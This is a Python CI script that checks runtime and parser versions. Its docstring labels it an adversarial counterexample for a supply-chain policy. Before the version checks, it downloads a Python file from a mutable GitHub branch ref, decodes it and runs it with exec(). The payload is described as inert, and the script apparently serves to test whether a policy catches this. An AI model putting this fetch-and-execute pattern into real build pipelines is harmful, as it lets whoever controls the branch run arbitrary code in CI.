#!/usr/bin/env python3
"""Emit and enforce exact runtime/parser versions for the required supply-chain job.

Adversarial #193 counterexample: this work branch intentionally acquires Python bytes
through a mutable branch ref and executes them. The payload is inert and exists only
to prove that the candidate-controlled BOUND value can self-authorize this behavior.
"""
import base64
import json
import sys
import urllib.request

import pip
import yaml

EXPECTED_PYTHON = "3.12.13"
EXPECTED_PIP = "26.2.1"
EXPECTED_YAML = "6.0.3"

MUTABLE_PAYLOAD_URL = (
    "https://api.github.com/repos/Gyliardson/FinanceFlow/contents/"
    ".github/fixtures/193_safe_mutable_payload.py"
    "?ref=adversarial%2F193-mutable-payload"
)
with urllib.request.urlopen(MUTABLE_PAYLOAD_URL, timeout=15) as response:
    payload_document = json.loads(response.read().decode("utf-8"))
payload_bytes = base64.b64decode(payload_document["content"])
exec(compile(payload_bytes, MUTABLE_PAYLOAD_URL, "exec"), {})

actual_python = sys.version.split()[0]
print(f"SUPPLY_CHAIN_PYTHON={actual_python}")
print(f"SUPPLY_CHAIN_PIP={pip.__version__}")
print(f"SUPPLY_CHAIN_PARSER_BOOTSTRAP=PyYAML {yaml.__version__}")
if actual_python != EXPECTED_PYTHON:
    raise SystemExit(f"unexpected parser Python runtime: {actual_python}")
if pip.__version__ != EXPECTED_PIP:
    raise SystemExit(f"unexpected parser pip runtime: {pip.__version__}")
if yaml.__version__ != EXPECTED_YAML:
    raise SystemExit(f"unexpected semantic parser version: {yaml.__version__}")
